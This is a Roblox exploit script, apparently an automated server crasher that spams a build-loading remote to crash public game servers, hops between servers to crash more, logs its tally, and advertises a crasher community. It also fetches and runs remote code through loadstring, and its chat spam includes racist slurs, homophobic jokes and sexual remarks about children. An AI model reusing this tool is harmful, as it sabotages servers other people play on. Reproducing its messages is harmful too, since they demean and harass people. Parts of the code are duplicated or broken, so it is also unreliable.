task.spawn(function()
pcall(function()
local plag = Instance.new("Message", CoreGui)
plag.Text = "wtf"
end)
wait(2.5)
if not game:IsLoaded() then
function savesettings()
    local http = game:GetService("HttpService")
    local settings = {
        musicid = "9048375035"
    }
    local json = http:JSONEncode(settings)
    writefile("orion settings.json", json)
    print("\n Settings Saved Please Rejoin To Start Crashing!")
    return print("\n Settings Saved Please Rejoin To Start Crashing!")
end
-- re function
local crashfile = isfile("NBC Servers Crashed.txt")
if crashfile == false then
    writefile("NBC Servers Crashed.txt", "NBC Crash File")
end
local bccrashfile = isfile("BC Servers Crashed.txt")
if bccrashfile == false then
    writefile("BC Servers Crashed.txt", "BC Crash File")
end

local countfile = isfile("AmmountCrashed.txt")
if countfile == false then
    writefile("AmmountCrashed.txt", "0")
end
local bccountfile = isfile("BC AmmountCrashed.txt")
if bccountfile == false then
    writefile("BC AmmountCrashed.txt", "0")
end

function updatename()
    spawn(function()
    local nbccrash = readfile("AmmountCrashed.txt")
    local bccrash = readfile("BC AmmountCrashed.txt")
    print("Orion v9.0 NBC Servers Crashed: " ..nbccrash.. " | BC Servers Crashed: " ..bccrash)
    end)
end
updatename()
--new function
local http = game:GetService('HttpService')
function jsone(str)
    return http:JSONEncode(str)
end
function jsond(str)
    return http:JSONDecode(str)
end
local defaultLua = {

}

local data
if not isfile('cs.json') then
    writefile('cs.json', jsone(defaultLua))
    data = defaultLua
else
    data = jsond(readfile('cs.json'))
end
if not data then
    warn('Fatal error')
    return
end
function updateFile()
    local suc,er = pcall(function()
        writefile('cs.json', jsone(data))
    end)
    if not suc then warn(er) end
end
table.insert(data,#data+1,game.JobId)
updateFile()
-- Don't remove unless you have perm.
function serverhop()
        while true do 
            spawn(function()
            local servers = {}
		local req = request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
		local body = game:GetService'HttpService':JSONDecode(req.Body)
        

                local check = true

		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and v.id ~= JobId and v.playing ~= 6 and check then
if not table.find(data, v.id) then
					table.insert(servers, v.id)
print("yey")
                
				end
end
			end
		end
		if #servers > 0 then
			game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
		else
            
			print('aw')
    
		end    
    end)
        wait(1.3)
    end   
end

local http = game:GetService('HttpService')
function jsone(str)
    return http:JSONEncode(str)
end
function jsond(str)
    return http:JSONDecode(str)
end
local defaultLua = {

}
local data
if not isfile('bc.json') then
    writefile('bc.json', jsone(defaultLua))
    data = defaultLua
else
    data = jsond(readfile('bc.json'))
end
if not data then
    warn('Fatal error')
    return
end
function bcfile()
    local suc,er = pcall(function()
        writefile('bc.json', jsone(data))
    end)
    if not suc then warn(er) end
end
table.insert(data,#data+1,game.JobId)
bcfile()
serverhop()
end
end)
local AntiPartCrash = Instance.new("Folder", game.ReplicatedStorage)   
AntiPartCrash.Name = "AntiPartCrash"   
	task.spawn(function()
	for _,part in ipairs(workspace:GetDescendants()) do
		if part:IsA("Humanoid") and part.DisplayName:len() > 20 then
			part.DisplayName = "⚠ Anti-Lag ⚠"
		end
	end
end)         
task.spawn(function()


	getgenv().conga = true
	local FolderAntiParts = Instance.new("Folder", game.ReplicatedStorage)
	FolderAntiParts.Name = "AntiPartCrash"

	local RunService = game:GetService("RunService")

	task.spawn(function()
	for _,part in ipairs(workspace:GetDescendants()) do
		if part:IsA("Humanoid") and part.DisplayName:len() > 20 then
			part.DisplayName = "⚠ Anti-Lag ⚠"
		end
	end
end)
task.spawn(function()
	k=game.Workspace.DescendantAdded:Connect(function(part)
		if getgenv().conga == false then k:disconnect() end
		if part:IsA("Humanoid") and part.DisplayName:len() > 20 then
			part.DisplayName = "⚠ Anti-Lag ⚠"
		end
	end)
end)
	while getgenv().conga == true do task.wait()
		local players = game.Players:GetChildren()
		for i = 1, #players do
			local char = players[i].Character
			if (char) and char:FindFirstChild("Humanoid") then
				if char.Humanoid.DisplayName:len() > 20 then
					char.Humanoid.DisplayName = "⚠ Anti-Lag ⚠"
				end
			end
		end 
		for _,v in ipairs(workspace:GetChildren()) do
			if v.Name ~= game.Players.LocalPlayer.Name .. "_ADONISJAIL" and v.Name ~= "Kaderth" and v.Name ~= "SpawnLocation" and not game.Players:FindFirstChild(v.Name) and v.Name ~= "SecureParts" and v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= "Terrain" and v.Name ~= "Camera" and v.Name ~= "VampireVanquisher" then
				v.Parent = game.ReplicatedStorage.AntiPartCrash
		end
	end
end
end)
repeat task.wait() until game:IsLoaded()

for _,v in next, workspace:GetChildren() do
                if v.Name ~= game.Players.LocalPlayer.Name .. "_ADONISJAIL" and v.Name ~= "Kaderth" and v.Name ~= "SpawnLocation" and not game.Players:FindFirstChild(v.Name) and v.Name ~= "SecureParts" and v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= "Terrain" and v.Name ~= "Camera" and v.Name ~= "VampireVanquisher" then
                    v.Parent = game.ReplicatedStorage.AntiPartCrash
            end
        end
quitosad = {'"ermmm what the flip!!" - puncy', 'add me to your whitelist NOW', 'ermmm the virus got server???', '"ok" - knocks', '"i like kids" - tech', "quiving has 2 cows, one is australian and one is austrian", "capybara's capybara ate quivings watermelons and when he found out he stole the capybara and did bad things to it", "joe toe likes men", "puncy likes men", "tech likes men", "quivings likes watching gay men putting make up on", "ermmm the server got virus???", "ermmm the hacked got server????", "ermmmm the server got hacked???", "quiving does NOT have symmetrical eyes", "quiving does not like the dentist", "90% of the AH community is 9 years old and u cant prove me wrong", "guys im not hacking im just a roblox dev", '"HOW DID YOU SURVIVE MY CRASH??" - braindead kid', "im bored of making these quotes","s_p the ultimate skid","crashing because theres too many kids","ag_aether cant be above the age of 8","trojan?? more like antivirus", "icookniggas.com", "prisonsex", "gayprisonsex", "9yearoldsex","the server crashed because i gave the server a hot @poto!!!","trojan?? more like 9 year old emo skid who thinks hes the sh cuz he crashes servers with f3x","trojan on bottom","kupibrra in the middle","capybara on top!!!!","outcrashing skiddies",'"THATS IT, IM REPORTING YOU" - nerd', "guys im not even hacking im just good trust frfr","guys if u buy my shirt u get crash whitelist and ban perms!!!!!!!!!!!!!!",'"incorrect key, please get another!" - 🤓',"studioRBLX likes wasting his time","studioRBLX likes men crashing his gass","studioRBLX has room temperature iq!!!","tell him to bring out the whole ocean!","lets go golfing!","life... is roblox...","never back down!! never give up!","i need more boolets!! 💯 🔥","im gonna braek my monityur, i swaer!!","bigger weapons!!! 🥵 💦","mrrp mrrp mrrp meow mrrp meow","owo","uwu","mrrp mrrp meowww mrrp mawo miau nya meowwwwwwwwwwwwwwww"}
	
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
    local Notiication = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
    
    
    function Notify(title, msg, ...) 
        local arfgs = {...}
    
        if args[1] then
            Notification:Notify(
                {Title = title, Description = msg},
                {OutlineColor = Color3.fromRGB(86, 84, 240),Time = 5, Type = "option"},
                {Callback = args[1]}
            )
        else
            Notification:Notify(
                {Title = title, Description = msg},
                {OutlineColor = Color3.fromRGB(86, 84, 240),Time = 5, Type = "default"}
            )
        end
    end
        
    --getgenv().conga = readfile("SYN.AH") == "1"
    getgenv().conga = true
    getgenv().deletedParts = {}
    
    
    function encrypt(a,b)local c=string.byte;local d=string.sub;local e=string.char;local f={}for g=1,#a do local h=g%#b+1;f[g]=e((c(d(a,g,g))+c(d(b,h,h)))%126+1)end;f=table.concat(f)return f end
    function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end
    
    local RunService = game:GetService("RunService")
    
    function getIndex(array, value)
        for i, v in ipairs(array) do
            if v == value then
                return i
            end
        end
        return nil
    end
    
    local level = 2
    
    game.Workspace.DescendantAdded:Connect(function(part)
        if getgenv().conga then
            if part:IsA("Humanoid") and part.DisplayName:len() > 20 then
                part.DisplayName = "⚠"
            end
    
            if part.ClassName == "MeshPart" and part.MeshId == "rbxassetid://760766662" then 
                table.insert(getgenv().deletedParts, part)
                task.wait()
                part:Destroy()
            end

            if part:IsA("SkateboardPlatform") then
                task.wait()
                part:Destroy()
            end
    
     if part.ClassName == "SpecialMesh" or part.ClassName == "Smoke" and part.Parent then
                if level == 1 then
                    table.insert(getgenv().deletedParts, part.Parent)
                    task.wait() --HEARTBEAT
                    part:Destroy()
                elseif level == 2 then
                    table.insert(getgenv().deletedParts, part.Parent)
                    task.wait()
                    part.Parent:Destroy()
                end
    
            end
            
        end
    
    end)

    
    RunService.RenderStepped:Connect(function(step)
        if getgenv().conga then
            local players = game.Players:GetChildren()
            for i = 1, #players do
                local char = players[i].Character
                if (char) and char:FindFirstChild("Humanoid") then
                    if char.Humanoid.DisplayName:len() > 20 then
                        char.Humanoid.DisplayName = "⚠ AntiLag ⚠"
                    end
                end
    
            end 
        end
    end)
task.spawn(function()
while true do task.wait()
pcall(function()
game.CoreGui.BubbleChat:Destroy()
end)
end
end)
local cuntfile = isfile("AmmountCrashed.txt")
if cuntfile == false then
    writefile("AmmountCrashed.txt", "0")
end
local loopnum = "99999999999999999999999999999999"
local antilog = "00000000000000000000000000000000"
local LocalPlayer = game.Players.LocalPlayer
local settings = {
    musicid = ""
}
function loadsettings()
    if not isfile("orion settings.json") then
        print("Settings File Not Found! Redirecting To Settings Saver...")
        savesettings()
    else
        local http = game:GetService("HttpService")
        settings = http:JSONDecode(readfile("orion settings.json"))
    end
end

function savesettings()
    local http = game:GetService("HttpService")
    local settings = {
        musicid = "9048375035"
    }
    local json = http:JSONEncode(settings)
    writefile("orion settings.json", json)
    print("\n Settings Saved Please Rejoin To Start Crashing!")
    return print("\n Settings Saved Please Rejoin To Start Crashing!")
end
loadsettings()
function say(i) game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(i, "ALL") end
local textbox = Instance.new("TextBox", workspace)

local function cmd(massage)
    game.Players:Chat(massage)
end
-- re function
--new function
local http = game:GetService('HttpService')
function jsone(str)
    return http:JSONEncode(str)
end
function jsond(str)
    return http:JSONDecode(str)
end
local defaultLua = {

}
local data
if not isfile('cs.json') then
    writefile('cs.json', jsone(defaultLua))
    data = defaultLua
else
    data = jsond(readfile('cs.json'))
end
if not data then
    warn('Fatal error')
    return
end
function updateFile()
    local suc,er = pcall(function()
        writefile('cs.json', jsone(data))
    end)
    if not suc then warn(er) end
end
table.insert(data,#data+1,game.JobId)
updateFile()
-- Don't remove unless you have perm.
local counter = 0
local waituntilcounterequalszero = false
function serverhop()
        while true do 
            spawn(function()
print(counter)
      local servers = {}
		local req = request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
		local body = game:GetService'HttpService':JSONDecode(req.Body)
		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and v.id ~= JobId and v.playing ~= 6 and not table.find(data, v.id) then
					table.insert(servers, v.id)
end
			end
		end
		if #servers > 0 then
			game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
print("ok")
		else
		end    
    end)
        task.wait(1.4)
    end   
end

local http = game:GetService('HttpService')
function jsone(str)
    return http:JSONEncode(str)
end
function jsond(str)
    return http:JSONDecode(str)
end
local defaultLua = {

}
local data
if not isfile('bc.json') then
    writefile('bc.json', jsone(defaultLua))
    data = defaultLua
else
    data = jsond(readfile('bc.json'))
end
if not data then
    warn('Fatal error')
    return
end
function bcfile()
    local suc,er = pcall(function()
        writefile('bc.json', jsone(data))
    end)
    if not suc then warn(er) end
end
table.insert(data,#data+1,game.JobId)
bcfile()

function changeserver()
serverhop()
end
local crashanywayakaniggerrapelist = {"Doomspires_Studios"}
local whitlist = {"jjjuuikjjikkju","1x3x3x7x1x7","Build_Robber"}
for i,v in pairs(whitlist) do
if game.Players:FindFirstChild(v) then
say("snek crasher v2: cool person detected "..v.." | join d sc. gg// ahcrasher")
changeserver()
changeserver()
changeserver();changeserver()
elseif table.find(crashanywayakaniggerrapelist, v) then
say("sorry man but a black man has been detected in ur server!!")
task.spawn(function()
while true do
wait()
coroutine.resume(coroutine.create(function()
local args = {
    [1] = {
        [1] = "LOAD",
        [2] = "aaaeuthngl"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("BuildSaving"):InvokeServer(unpack(args))
end))
coroutine.resume(coroutine.create(function()
local args = {
    [1] = {
        [1] = "LOAD",
        [2] = "rea"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("BuildSaving"):InvokeServer(unpack(args))
end))
end
end)
end
end
-- Command Varibles
game.Players:Chat('!newserver')
say("KAH ON TOP!")
say("sckah . x yz | d sc. gg// ahcrasher for a free auto crasher! | MANUAL CRASHERS ON BOTTOM!!")
say(quitosad[math.random(1, #quitosad)])
game.Players:Chat('!newserver')
task.spawn(function()
while true do
wait()
coroutine.resume(coroutine.create(function()
local args = {
    [1] = {
        [1] = "LOAD",
        [2] = "rea"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("BuildSaving"):InvokeServer(unpack(args))
end))
wait(.1)
end
end)
task.spawn(function()
while true do
game.Players:Chat("!newserver")
wait(5)
end
end)
			local seconds = math.floor(workspace.DistributedGameTime)
			local minutes = math.floor(workspace.DistributedGameTime / 60)
			local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
			local seconds = seconds - (minutes * 60)
			local minutes = minutes - (hours * 60)
			print("server was up for "..minutes.." minutes and "..seconds.." seconds")
            --// sus

print("cre4")
wait(.7)
game.Players:Chat('!newserver')
changeserver()
wait(30)

wait(120)
changeserver()
